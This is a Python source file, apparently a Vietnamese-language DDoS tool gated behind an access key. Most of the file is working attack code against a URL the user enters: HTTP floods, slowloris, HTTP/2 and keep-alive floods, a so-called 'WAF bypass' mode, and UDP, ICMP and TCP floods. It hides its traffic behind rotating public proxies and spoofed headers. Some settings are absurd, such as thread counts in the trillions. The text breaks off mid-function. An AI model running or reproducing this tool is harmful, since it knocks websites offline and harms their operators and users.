#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
from colorama import init, Fore, Back, Style
import socket
import ssl
import whois
import dns.resolver
from bs4 import BeautifulSoup
import hmac
import base64
import sys
import struct
import asyncio
import http.client
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import importlib.util

# Attempt to import h2 for HTTP/2 support
try:
    import h2.connection
    import h2.config
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False

# Initialize colorama
init()

# Fallback ANSI codes
try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    class Fore:
        CYAN = '\033[96m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

    class Back:
        BLACK = '\033[40m'
        BLUE = '\033[44m'
        CYAN = '\033[46m'
        RED = '\033[41m'
        YELLOW = '\033[43m'
        MAGENTA = '\033[45m'
        RESET = '\033[0m'

    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

# Configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

PROXY_LIST = []
USE_PROXY = True  # Global flag for proxy usage

POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"])
}

# Removed first 10 configurations (ids 1-10)
TARGET_CONFIGS = [
    {"id": "11", "name": "layer7", "category": "High-Impact", "threads": 25000, "requests": 4000, "desc": "Tấn công tầng 7", "level": "Cao", "application": "Quá tải web"},
    {"id": "12", "name": "multi_vec", "category": "High-Impact", "threads": 30000, "requests": 6000, "desc": "Đa vector kết hợp", "level": "Rất Cao", "application": "Mục tiêu lớn"},
    {"id": "13", "name": "god", "category": "Extreme", "threads": 30000, "requests": 1000, "desc": "Tấn công cấp thần", "level": "Rất Cao", "application": "Bảo mật cao"},
    {"id": "14", "name": "hyper", "category": "Extreme", "threads": 10000000, "requests": 1000, "desc": "Siêu tốc 10M", "level": "Cực Cao", "application": "Hệ thống lớn"},
    {"id": "15", "name": "supra", "category": "Extreme", "threads": 20000000, "requests": 1000, "desc": "Tối cao 20M", "level": "Cực Cao", "application": "Mục tiêu siêu lớn"},
    {"id": "16", "name": "pulsar", "category": "Extreme", "threads": 30000000, "requests": 1000, "desc": "Pulsar 30M", "level": "Cực Cao", "application": "Hệ thống phân tán"},
    {"id": "17", "name": "quasar", "category": "Extreme", "threads": 35000000, "requests": 1000, "desc": "Quasar 35M", "level": "Cực Cao", "application": "Hệ thống CDN"},
    {"id": "18", "name": "prime", "category": "Extreme", "threads": 50000000, "requests": 1000, "desc": "Prime 50M", "level": "Cực Cao", "application": "Tải cao"},
    {"id": "19", "name": "cosmic", "category": "Extreme", "threads": 60000000, "requests": 1000, "desc": "Cosmic 60M", "level": "Cực Cao", "application": "Quy mô lớn"},
    {"id": "20", "name": "ultima", "category": "Extreme", "threads": 100000000, "requests": 1000, "desc": "Tối thượng 100M", "level": "Cực Cao", "application": "Doanh nghiệp"},
    {"id": "21", "name": "nova", "category": "Extreme", "threads": 100000000, "requests": 1000, "desc": "Supernova 100M", "level": "Cực Cao", "application": "Tải cực lớn"},
    {"id": "22", "name": "titan", "category": "Extreme", "threads": 5000000, "requests": 1000, "desc": "Titan 5M", "level": "Cực độ", "application": "Hệ thống lớn"},
    {"id": "23", "name": "void", "category": "Extreme", "threads": 234000000, "requests": 1000, "desc": "Void 234M", "level": "Cực độ", "application": "Siêu bền"},
    {"id": "24", "name": "abyss", "category": "Extreme", "threads": 700000000, "requests": 1000, "desc": "Abyss 700M", "level": "Cực độ", "application": "Cấp quốc gia"},
    {"id": "25", "name": "omega", "category": "Extreme", "threads": 1000000000, "requests": 1000, "desc": "Omega 1B", "level": "Cực độ", "application": "Siêu bảo mật"},
    {"id": "26", "name": "giga", "category": "Extreme", "threads": 1000000000000, "requests": 1000, "desc": "Giga 1T", "level": "Tối đa", "application": "Toàn cầu"},
    {"id": "27", "name": "persist", "category": "Specialized", "threads": 1000000000000, "requests": 10000, "desc": "Tấn công liên tục", "level": "Tối đa", "application": "Không ngừng"},
    {"id": "28", "name": "http2_mux", "category": "Specialized", "threads": 10000, "requests": 1000, "desc": "HTTP/2 multiplex", "level": "Cao", "application": "Máy chủ HTTP/2"},
    {"id": "29", "name": "keep_alive", "category": "Specialized", "threads": 10000, "requests": 1000, "desc": "Keep-Alive+Pipe", "level": "Cao", "application": "Máy chủ HTTP"},
    {"id": "30", "name": "multi_proc", "category": "Specialized", "threads": 20000, "requests": 2000, "desc": "Đa tiến trình", "level": "Cao", "application": "Hiệu suất cao"},
    {"id": "31", "name": "multi_async", "category": "Specialized", "threads": 20000, "requests": 2000, "desc": "Đa tiến trình+Async", "level": "Cao", "application": "Bất đồng bộ"},
    {"id": "32", "name": "udp_flood", "category": "Specialized", "threads": 20000, "requests": 5000, "desc": "UDP tầng 4", "level": "Cao", "application": "Tấn công mạng"},
    {"id": "33", "name": "waf_bypass", "category": "Specialized", "threads": 25000, "requests": 4000, "desc": "Vượt qua WAF", "level": "Cao", "application": "Bypass WAF"},
    {"id": "34", "name": "tcp_udp", "category": "Specialized", "threads": 25000, "requests": 5000, "desc": "TCP/UDP tầng 4", "level": "Cao", "application": "Tấn công mạng"},
    {"id": "35", "name": "ultima_x", "category": "Specialized", "threads": 30000, "requests": 6000, "desc": "Tấn công 3 năng", "level": "Rất Cao", "application": "Đa tầng"}
]

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
EXPECTED_HASH = None

# Diagnostic Function
def run_diagnostics():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}┌─────[ CHẨN ĐOÁN HỆ THỐNG ]─────┐{Style.RESET_ALL}")
    diagnostics = []

    # Check required modules
    required_modules = ['requests', 'colorama', 'h2', 'bs4', 'whois', 'dns.resolver', 'aiohttp']
    for module in required_modules:
        if importlib.util.find_spec(module):
            diagnostics.append((f"Module {module}", "✅ Đã cài đặt"))
        else:
            diagnostics.append((f"Module {module}", f"{Fore.RED}❌ Chưa cài đặt{Fore.RESET}"))

    # Check file integrity
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
        diagnostics.append(("Tính toàn vẹn tệp", "✅ Hợp lệ"))
    except Exception as e:
        diagnostics.append(("Tính toàn vẹn tệp", f"{Fore.RED}❌ Lỗi: {str(e)}{Fore.RESET}"))

    # Check proxy availability
    try:
        fetch_proxies_from_api()
        if PROXY_LIST:
            diagnostics.append(("Danh sách proxy", f"✅ {len(PROXY_LIST)} proxy sống"))
        else:
            diagnostics.append(("Danh sách proxy", f"{Fore.YELLOW}⚠ Không có proxy sống{Fore.RESET}"))
    except Exception as e:
        diagnostics.append(("Danh sách proxy", f"{Fore.RED}❌ Lỗi: {str(e)}{Fore.RESET}"))

    # Check network connectivity
    try:
        response = requests.get("https://www.google.com", timeout=5)
        if response.status_code == 200:
            diagnostics.append(("Kết nối mạng", "✅ Kết nối thành công"))
        else:
            diagnostics.append(("Kết nối mạng", f"{Fore.YELLOW}⚠ Mã trạng thái: {response.status_code}{Fore.RESET}"))
    except Exception as e:
        diagnostics.append(("Kết nối mạng", f"{Fore.RED}❌ Lỗi: {str(e)}{Fore.RESET}"))

    # Check system resources
    try:
        cpu_count = multiprocessing.cpu_count()
        diagnostics.append(("Số CPU", f"✅ {cpu_count} lõi"))
    except Exception as e:
        diagnostics.append(("Số CPU", f"{Fore.RED}❌ Lỗi: {str(e)}{Fore.RESET}"))

    # Display diagnostics
    for check, status in diagnostics:
        print(f"{Fore.CYAN}│ {check:<20} : {status:<30} │{Fore.RESET}")
    print(f"{Fore.CYAN}└{'─' * 34}┘{Style.RESET_ALL}")
    input(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.CYAN}⏎ Nhấn Enter để trở về menu chính...{Fore.RESET}")

# Proxy API Functions
def validate_proxy(proxy, test_url="https://www.google.com"):
    try:
        response = requests.get(test_url, proxies=proxy, timeout=5)
        return response.status_code == 200
    except Exception:
        return False

def fetch_proxies_from_api(api_url="https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc"):
    global PROXY_LIST
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            PROXY_LIST = [
                {"http": f"http://{proxy['ip']}:{proxy['port']}", "https": f"https://{proxy['ip']}:{proxy['port']}"}
                for proxy in data['data']
                if proxy['protocols'][0] in ['http', 'https']
            ]
            print(f"{Fore.GREEN}✅ [HỆ THỐNG] Đã tải {len(PROXY_LIST)} proxy từ API{Fore.RESET}")
            
            # Validate proxies
            live_proxies = []
            with ThreadPoolExecutor(max_workers=10) as executor:
                future_to_proxy = {executor.submit(validate_proxy, proxy): proxy for proxy in PROXY_LIST}
                for future in future_to_proxy:
                    if future.result():
                        live_proxies.append(future_to_proxy[future])
            
            PROXY_LIST = live_proxies
            print(f"{Fore.GREEN}✅ [HỆ THỐNG] Số proxy sống: {len(PROXY_LIST)}{Fore.RESET}")
        else:
            print(f"{Fore.RED}🚨 [LỖI] Không thể tải proxy từ API: Mã trạng thái {response.status_code}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}🚨 [LỖI] Không thể tải proxy từ API: {str(e)}{Fore.RESET}")

# Utility Functions
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(text="Chuẩn bị triển khai", duration=3):
    print(f"{Fore.RED}{Style.BRIGHT}🚀 [HỆ THỐNG] {text}...{Style.RESET_ALL}{Fore.RESET}")
    for _ in range(3):
        print(f"{Fore.YELLOW}█{Fore.RESET}", end="", flush=True)
        time.sleep(duration / 3)
    print(f"\n{Fore.GREEN}{Style.BRIGHT}✅ [HỆ THỐNG] {text} - Hoàn tất!{Style.RESET_ALL}{Fore.RESET}")

def typing_effect(text, delay=0.02):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                print(f"{Fore.YELLOW}🔒 [HỆ THỐNG] Tạo mã băm mới: {file_hash}{Fore.RESET}")
            elif file_hash != EXPECTED_HASH:
                print(f"{Fore.RED}🚨 [LỖI NGHIÊM TRỌNG] Tệp bị thay đổi! Thoát.{Fore.RESET}")
                exit(1)
    except Exception as e:
        print(f"{Fore.RED}🚨 [LỖI NGHIÊM TRỌNG] Kiểm tra tính toàn vẹn thất bại: {str(e)}{Fore.RESET}")
        exit(1)

def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
    }

def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST and USE_PROXY else None

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: {e}")

def save_attack_config(url, num_threads, requests_per_thread, target_type, use_proxy):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "use_proxy": use_proxy,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        print(f"{Fore.YELLOW}💾 [HỆ THỐNG] Cấu hình tấn công liên tục đã lưu: {url}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}🚨 [LỖI] Không thể lưu cấu hình tấn công: {str(e)}{Fore.RESET}")

def generate_key_hash(key):
    secret = "QUANGBAO2025ULTIMATE"
    return hmac.new(secret.encode(), key.encode(), hashlib.sha512).hexdigest()

def validate_key():
    VALID_KEY = "baoddos"
    VALID_KEY_HASH = generate_key_hash(VALID_KEY)
    attempts = 0
    max_attempts = 3
    while attempts < max_attempts:
        clear_screen()
        display_banner()
        print(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.RESET}", end="")
        user_key = input(f"{Fore.YELLOW}🔑 Nhập mã truy cập: {Fore.WHITE}").strip()
        loading_animation("Xác minh thông tin", 2)
        if generate_key_hash(user_key) == VALID_KEY_HASH:
            print(f"{Fore.GREEN}{Style.BRIGHT}✅ [HỆ THỐNG] Truy cập được cấp! Hệ thống kích hoạt.{Style.RESET_ALL}{Fore.RESET}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(f"{Fore.RED}{Style.BRIGHT}🚨 [HỆ THỐNG] Mã không hợp lệ! Còn {remaining} lần thử.{Style.RESET_ALL}{Fore.RESET}")
            if remaining == 0:
                print(f"{Fore.RED}{Style.BRIGHT}🔒 [HỆ THỐNG] Truy cập bị khóa!{Style.RESET_ALL}{Fore.RESET}")
                return False
            time.sleep(1)

def assess_target_security(url):
    session = requests.Session()
    try:
        response_times = []
        status_codes = []
        for _ in range(10):
            start_time = time.perf_counter()
            try:
                response = session.get(url, headers=generate_random_headers(), proxies=get_random_proxy(), timeout=5)
                end_time = time.perf_counter()
                response_times.append((end_time - start_time) * 1000)
                status_codes.append(response.status_code)
            except requests.exceptions.RequestException:
                break
            time.sleep(0.1)
        if not response_times:
            print(f"{Fore.RED}🚨 [LỖI] Không thể kết nối mục tiêu{Fore.RESET}")
            return "CAO", 2000, 1000
        avg_response_time = sum(response_times) / len(response_times)
        error_rate = status_codes.count(500) / len(status_codes)
        security_score = 0
        if avg_response_time < 1000:
            security_score += 30
        if error_rate < 0.1:
            security_score += 20
        if security_score < 50:
            security_level = "THẤP"
            recommended_threads = 500
            recommended_requests = 200
            print(f"{Fore.GREEN}🛡️ [KẾT QUẢ] Mục tiêu: Bảo mật thấp - Dễ tấn công{Fore.RESET}")
        elif security_score < 80:
            security_level = "TRUNG BÌNH"
            recommended_threads = 1000
            recommended_requests = 500
            print(f"{Fore.YELLOW}🛡️ [KẾT QUẢ] Mục tiêu: Bảo mật trung bình - Cần lực lượng vừa phải{Fore.RESET}")
        else:
            security_level = "CAO"
            recommended_threads = 2000
            recommended_requests = 1000
            print(f"{Fore.RED}🛡️ [KẾT QUẢ] Mục tiêu: Bảo mật cao - Cần lực lượng tối đa{Fore.RESET}")
        return security_level, recommended_threads, recommended_requests
    except Exception as e:
        print(f"{Fore.RED}🚨 [LỖI] Lỗi nghiêm trọng: {str(e)}{Fore.RESET}")
        return "CAO", 2000, 1000

# Attack Functions
def persistent_attack_process(url, requests_per_thread):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
            elif method == "POST":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
            else:
                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
            if response.status_code in (429, 403, 522):
                print(f"{Fore.RED}🔥 [LIÊN TỤC] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [LIÊN TỤC] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [LIÊN TỤC] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0001, 0.001))

def http2_multiplexing_attack(url):
    if not HTTP2_AVAILABLE:
        print(f"{Fore.RED}🚨 [HTTP/2] Tấn công bị vô hiệu hóa: Chưa cài đặt module 'h2'{Fore.RESET}")
        return
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 443
    try:
        conn = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
        h2_conn = h2.connection.H2Connection()
        h2_conn.initiate_connection()
        conn.send(h2_conn.data_to_send())
        headers = {
            ':method': 'GET',
            ':path': '/',
            ':scheme': 'https',
            ':authority': host,
            'user-agent': random.choice(USER_AGENTS),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
        }
        while True:
            for stream_id in range(1, 100, 2):
                h2_conn.send_headers(stream_id, headers)
                conn.send(h2_conn.data_to_send())
            response = conn.getresponse()
            response.read()
            if response.status in (429, 403, 522):
                print(f"{Fore.RED}🔥 [HTTP/2] Tấn công: Mã trạng thái {response.status} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [HTTP/2] Tấn công: Mã trạng thái {response.status}{Fore.RESET}")
            time.sleep(0.001)
    except Exception as e:
        print(f"{Fore.RED}🚨 [HTTP/2] Tấn công thất bại: {str(e)}{Fore.RESET}")
    finally:
        conn.close()

def keep_alive_pipelining_attack(url):
    session = requests.Session()
    headers = generate_random_headers()
    headers['Connection'] = 'keep-alive'
    headers['Keep-Alive'] = 'timeout=5, max=1000'
    proxy = get_random_proxy()
    while True:
        try:
            for _ in range(10):
                session.get(url, headers=headers, proxies=proxy, timeout=2)
            response = session.get(url, headers=headers, proxies=proxy, timeout=2)
            if response.status_code in (429, 403, 522):
                print(f"{Fore.RED}🔥 [KEEP-ALIVE] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [KEEP-ALIVE] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [KEEP-ALIVE] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

def multiprocessing_attack(url, requests_per_process):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
            elif method == "POST":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
            else:
                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
            if response.status_code in (429, 403, 522):
                print(f"{Fore.RED}🔥 [ĐA TIẾN TRÌNH] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [ĐA TIẾN TRÌNH] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [ĐA TIẾN TRÌNH] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

async def async_request(url, session):
    try:
        headers = generate_random_headers()
        proxy = get_random_proxy()
        async with session.get(url, headers=headers, proxy=proxy, timeout=2) as response:
            if response.status in (429, 403, 522):
                print(f"{Fore.RED}🔥 [ĐA TIẾN TRÌNH+ASYNC] Tấn công: Mã trạng thái {response.status} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [ĐA TIẾN TRÌNH+ASYNC] Tấn công: Mã trạng thái {response.status}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}🚨 [ĐA TIẾN TRÌNH+ASYNC] Tấn công thất bại: {str(e)}{Fore.RESET}")

async def multiprocessing_async_attack(url):
    async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
        while True:
            tasks = [async_request(url, session) for _ in range(10)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.001)

def multiprocessing_async_wrapper(url, requests_per_process):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(multiprocessing_async_attack(url))

def udp_flood_attack(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            payload = os.urandom(random.randint(64, 1400))
            sock.sendto(payload, (host, port))
            print(f"{Fore.RED}🔥 [UDP FLOOD] Gửi gói tin đến {host}:{port}{Fore.RESET}")
            time.sleep(0.0001)
    except Exception as e:
        print(f"{Fore.RED}🚨 [UDP FLOOD] Tấn công thất bại: {str(e)}{Fore.RESET}")
    finally:
        sock.close()

def icmp_flood_attack(host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(1)
        while True:
            payload = os.urandom(60000)
            icmp_packet = struct.pack("!BBHHH", 8, 0, 0, 0, 0) + payload
            sock.sendto(icmp_packet, (host, 0))
            print(f"{Fore.RED}🔥 [ICMP FLOOD] Gửi gói tin ICMP đến {host}{Fore.RESET}")
            time.sleep(0.0001)
    except PermissionError:
        print(f"{Fore.RED}🚨 [ICMP FLOOD] Lỗi: Cần quyền root để gửi gói tin ICMP{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}🚨 [ICMP FLOOD] Tấn công thất bại: {str(e)}{Fore.RESET}")
    finally:
        sock.close()

def layer4_tcp_udp_flood(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        attack_types = ["SYN", "ACK", "RST"]
        while True:
            try:
                attack_type = random.choice(attack_types)
                if attack_type == "SYN":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x00" * random.randint(64, 1400))
                elif attack_type == "ACK":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x10" * random.randint(64, 1400))
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x04" * random.randint(64, 1400))
                print(f"{Fore.RED}🔥 [TCP/UDP FLOOD] Gửi {attack_type} đến {host}:{port}{Fore.RESET}")
            except:
                pass
            time.sleep(0.0001)
    except Exception as e:
        print(f"{Fore.RED}🚨 [TCP/UDP FLOOD] Tấn công thất bại: {str(e)}{Fore.RESET}")
    finally:
        sock.close()

def layer7_waf_bypass_attack(url):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            if HTTP2_AVAILABLE and urllib.parse.urlparse(url).scheme == 'https':
                http2_multiplexing_attack(url)
            else:
                headers['Connection'] = 'keep-alive'
                headers['Keep-Alive'] = 'timeout=5, max=1000'
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                if response.status_code in (429, 403, 522):
                    print(f"{Fore.RED}🔥 [WAF BYPASS] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}⚡ [WAF BYPASS] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [WAF BYPASS] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0001, 0.001))

def slowloris_attack(url, duration):
    session = requests.Session()
    sockets = []
    try:
        for _ in range(500):
            headers = generate_random_headers()
            headers['Connection'] = 'keep-alive'
            sock = session.get(url, headers=headers, proxies=get_random_proxy(), timeout=30, stream=True)
            sockets.append(sock)
            time.sleep(0.01)
        time.sleep(duration)
    except Exception as e:
        print(f"{Fore.RED}🚨 [SLOWLORIS] Lỗi: {str(e)}{Fore.RESET}")
    finally:
        for sock in sockets:
            sock.close()

def http_flood_attack(url, request_count):
    session = requests.Session()
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "A" * 102400
            response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
            print(f"{Fore.RED}🔥 [HTTP FLOOD] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [HTTP FLOOD] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

def unlimited_threads_attack(url):
    session = requests.Session()
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "A" * 102400
            response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=3)
            print(f"{Fore.RED}🔥 [VÔ HẠN] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [VÔ HẠN] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

def overload_429_403_attack(url, request_count):
    session = requests.Session()
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            method = random.choice(["GET", "POST", "HEAD"])
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
            elif method == "POST":
                response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
            else:
                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
            if response.status_code in (429, 403):
                print(f"{Fore.RED}🔥 [QUÁ TẢI 429/403] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [QUÁ TẢI 429/403] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [QUÁ TẢI 429/403] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.0005)

def blitz_522_attack(url, request_count):
    session = requests.Session()
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * 204800
            response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
            if response.status_code == 522:
                print(f"{Fore.RED}🔥 [BLITZ 522] Tấn công: Mã trạng thái 522 - KẾT NỐI MỤC TIÊU NGẮT!{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [BLITZ 522] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [BLITZ 522] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.0003)

def combined_all_attack(url, request_count):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            attack_type = random.choice(["slowloris", "flood", "429403", "522", "http2", "keep_alive"])
            if attack_type == "slowloris":
                sock = session.get(url, headers=headers, proxies=proxy, timeout=30, stream=True)
                print(f"{Fore.RED}🔥 [KẾT HỢP] Tấn công: Kết nối Slowloris giữ{Fore.RESET}")
                time.sleep(0.01)
                sock.close()
            elif attack_type == "flood":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
                print(f"{Fore.RED}🔥 [KẾT HỢP] Tấn công: HTTP Flood - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "429403":
                method = random.choice(methods)
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                if response.status_code in (429, 403):
                    print(f"{Fore.RED}🔥 [KẾT HỢP] Tấn công: 429/403 - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}⚡ [KẾT HỢP] Tấn công: 429/403 - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "522":
